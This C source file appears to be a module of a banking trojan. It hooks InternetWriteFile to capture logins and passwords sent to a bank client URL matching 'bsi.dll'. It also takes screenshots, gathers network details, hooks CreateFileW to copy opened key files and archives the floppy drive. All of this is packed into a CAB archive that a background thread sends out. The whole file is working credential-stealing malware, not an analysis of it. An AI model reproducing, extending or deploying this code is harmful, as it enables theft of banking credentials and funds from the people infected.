#include "BSS.h"

#include "Loader.h"

#include "BotClasses.h"

//bss

typedef struct
{
	HCAB hCab; 
	bool Initialize;
	char *Path;
	bool Form;
	DWORD dwEntry;
	bool bFloppy;
} BSS, *PBSS;

PBSS pBanking;
PList HashListBBS = NULL;

bool bHookBSSCreateFileWOnce = false;

bool InitializeBSS()
{
	
	MemFree( pBanking );
	pBanking = (PBSS)MemAlloc( sizeof( PBSS ) );
	m_memset( pBanking, 0, sizeof( PBSS ) );	
	if ( pBanking )
	{		
		pBanking->Path = GetTempNameA();
		if ( pBanking->Path )
		{
			if ( ( pBanking->hCab = CreateCab( pBanking->Path ) ) != NULL )
			{
				pBanking->Initialize = true;
				return true;
			}
		}
	}
	return false;
}

bool IsBSSFileFormat( WCHAR *lpFileName )
{
	DWORD dwBssFormats[] = { 0x18F2F2, 0x1AF2F9, 0x1CF2E3,
							 0x1C3AE2, 0x18F96C, 0x1BF871,
							 0x193133, 0x1C32ED, 0x1CB2F1, 0 };
	pOutputDebugStringW("isbss");
	pOutputDebugStringW(lpFileName);
	DWORD dwHash = GetFileFormat( lpFileName );

	for ( DWORD i = 0; dwBssFormats[i] != 0; i++ )
	{
		if ( dwHash == dwBssFormats[i] )
		{
				pOutputDebugStringW("isbssTRUE!!!!!!!!!!!!!!!!!!!");
	pOutputDebugStringW(lpFileName);
			return true;
		}
	}

	return false;	
}


typedef HANDLE ( WINAPI *BSSFUNC_CreateFileW	   )( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
typedef BOOL   ( WINAPI *BSSFUNC_InternetWriteFile )( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten );

BSSFUNC_InternetWriteFile REAL_BSSInternetWriteFile;
BSSFUNC_CreateFileW	      REAL_BSSCreateFileW;

void AddHashBBS(DWORD Hash)
{
	List::Add(HashListBBS, (LPVOID)Hash);
}

bool FindHashBBS(DWORD Hash)
{
	return List::IndexOf(HashListBBS, (LPVOID)Hash) >= 0;
}


HANDLE WINAPI HOOK_BSSCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE hRet = REAL_BSSCreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
pOutputDebugStringA("lpFileName"); 
	pOutputDebugStringW(lpFileName); 
	if ( IsBSSFileFormat( (WCHAR*)lpFileName ) && pBanking->Form )
	{
		WCHAR FileName[ MAX_PATH ];
		plstrcpyW( FileName, lpFileName );

		DWORD dwFileHash = CalcHashW( (WCHAR*)FileName );

		if ( !FindHashBBS( dwFileHash ) )
		{			
			pCloseHandle( hRet );
			HANDLE hFile = REAL_BSSCreateFileW( FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	
			if ( hFile != INVALID_HANDLE_VALUE )
			{		
				DWORD h;
				DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );		

				LPBYTE lpFile = NULL;

				if ( dwFileSize > 0 )
				{
					HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, 0, 0 );

					if ( hMapFile != INVALID_HANDLE_VALUE )
					{
						LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

						if ( pbyFile != NULL )
						{
							WCHAR *TempPath = GetTempName();

							if ( TempPath )
							{
								HANDLE hTmp = REAL_BSSCreateFileW( TempPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
							
								if ( hTmp != (HANDLE)-1 )
								{
									DWORD dwWritten = 0;
									pWriteFile( hTmp, pbyFile, dwFileSize, &dwWritten, 0 );
								}

								pCloseHandle( hTmp );
								AddHashBBS( dwFileHash );

								if ( AddFileToCab( pBanking->hCab, ToAnsi( TempPath ), ToAnsi( FileName ) ) )
								{
									pBanking->dwEntry++;
								}

								pDeleteFileW( TempPath );
							}

							MemFree( TempPath );
						}

						pUnmapViewOfFile( pbyFile );
					}

					pCloseHandle( hMapFile );
				}
			}

			pCloseHandle( hFile );

			hRet = REAL_BSSCreateFileW( FileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
		}
	}

	return hRet; 
}

void HookBSSCreateFileW()
{
	UnhookCreateFileW();
	pOutputDebugStringA("??? ?????????");
	if ( HookApi( 1, 0x8F8F102, (DWORD)&HOOK_BSSCreateFileW ) )
	{
		__asm mov [REAL_BSSCreateFileW], eax
	}

	return;
}

void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite )
{	
	if ( lpBuffer != NULL && dwNumberOfBytesToWrite )
	{
		DWORD dwUrlSize = 1024;

		char *Url = (char*)MemAlloc( dwUrlSize + 1 );

		if ( Url )
		{
			if ( pInternetQueryOptionA( hFile, INTERNET_OPTION_URL, Url, &dwUrlSize ) )
			{
				if ( CompareUrl( "*bsi.dll*", Url ) )
				{
					char *Buffer = (char*)MemAlloc( 1024 );

					PCHAR Tmp = (PCHAR)lpBuffer;
					PCHAR Login		= GetTextBetween(Tmp,  "<L>", "</L>" );
					PCHAR Password	= GetTextBetween(Tmp,  "<P>", "</P>" );
					if ( Login != NULL && Password != NULL)
					{
						HINTERNET hParent;
						DWORD dwSize = sizeof( HINTERNET );

						char UserAgent[256];

						pInternetQueryOptionA( hFile, INTERNET_OPTION_PARENT_HANDLE, &hParent, &dwSize );
						pInternetQueryOptionA( hParent, INTERNET_OPTION_PARENT_HANDLE, &hParent, &dwSize );

						dwSize = sizeof( UserAgent ) - 1;

						if ( !pInternetQueryOptionA( hParent, INTERNET_OPTION_USER_AGENT, UserAgent, &dwSize ) )
						{
							UserAgent[0] = '-';
							UserAgent[1] = '\0';
						}

						char Template[] = "Url: %s\r\n"
										  "Login: %s\r\n"
										  "Password: %s\r\n"
										  "UserAgent: %s\r\n";

						typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
						fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

						pwsprintfA( Buffer, Template, Url, Login, Password, UserAgent );

						char *TempFile = GetTempNameA();
						bool AddLog = false;

						if ( TempFile )
						{
							HANDLE hLog = (HANDLE)pCreateFileA( TempFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
							if ( hLog != INVALID_HANDLE_VALUE )
							{
								DWORD dwWritten = 0;

								if ( (BOOL)pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 ) )
								{
									AddLog = true;
								}

							}

							pCloseHandle( hLog );
						}

						if ( AddLog )
						{
							if ( InitializeBSS() )
							{
								if ( AddFileToCab( pBanking->hCab, TempFile, "Information.txt" ) )
								{
									LPVOID lpScrFile;
									DWORD dwScrSize;
									GetScreen( &lpScrFile, &dwScrSize );

									bool bAddScreen  = false;
									char *ScreenFile = GetTempNameA();

									if ( lpScrFile && ScreenFile )
									{										
										HANDLE hScreen = (HANDLE)pCreateFileA( ScreenFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

										if ( hScreen != INVALID_HANDLE_VALUE )
										{
											DWORD dwWritten = 0;

											if ( (BOOL)pWriteFile( hScreen, lpScrFile, dwScrSize, &dwWritten, 0 ) )
											{
												bAddScreen = true;
											}
										}

										pCloseHandle( hScreen );
									}			

									MemFree( lpScrFile );

									if ( bAddScreen )
									{
										AddFileToCab( pBanking->hCab, ScreenFile, "screen.jpeg" );
									}

									MemFree( ScreenFile );

									char *NetFile = GetNetInfo();

									if ( NetFile != NULL )
									{
										AddFileToCab( pBanking->hCab, NetFile, "NetInfo.txt" );
										pDeleteFileA( NetFile );
									}

									MemFree( NetFile );

									pDeleteFileA( TempFile );
									pBanking->Form = true;

									pSetErrorMode( SEM_FAILCRITICALERRORS ); 

									if ( AddDirToCab( pBanking->hCab, "A:", "Floppy" ) )
									{
										pBanking->bFloppy = true;
									}

									HookBSSCreateFileW();
								}
							}
						}

						MemFree( TempFile );
					}

					MemFree( Buffer );
					STR::Free( Login );
					STR::Free( Password );
				}
			}
		}
	}

	if ( pBanking != NULL && pBanking->dwEntry )
	{
		UnhookCreateFileW();

		if ( !pBanking->bFloppy )
		{
			pSetErrorMode( SEM_FAILCRITICALERRORS ); 
			AddDirToCab( pBanking->hCab, "A:", "Floppy" );
		}

		CloseCab( pBanking->hCab );

		PBSSINIST pBank = (PBSSINIST)MemAlloc( sizeof( PBSSINIST ) );

		if ( pBank )
		{
			pBank->dwType	= 1;
			pBank->FilePath = (char*)MemAlloc( m_lstrlen( pBanking->Path ) + 1 );

			m_memcpy( pBank->FilePath, pBanking->Path, m_lstrlen( pBanking->Path ) );
		
			StartThread( SendBSSInist, pBank );
		}

		MemFree( pBanking );
	}
}


BOOL WINAPI HOOK_BSSInternetWriteFile( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten )
{
	GetBSSInfo( hFile, lpBuffer, dwNumberOfBytesToWrite );
	return REAL_BSSInternetWriteFile( hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten );
}

bool bBSSHooked;

void BSSHooks()
{
	if ( !bBSSHooked )
	{
		
		HashListBBS = List::Create();
		if ( HookApi( 8, 0x205BD56A, (DWORD)&HOOK_BSSInternetWriteFile ) )
		{
			__asm mov [REAL_BSSInternetWriteFile], eax
		}
HookBSSCreateFileW();
		bBSSHooked = true;
	}
	
	return;
}
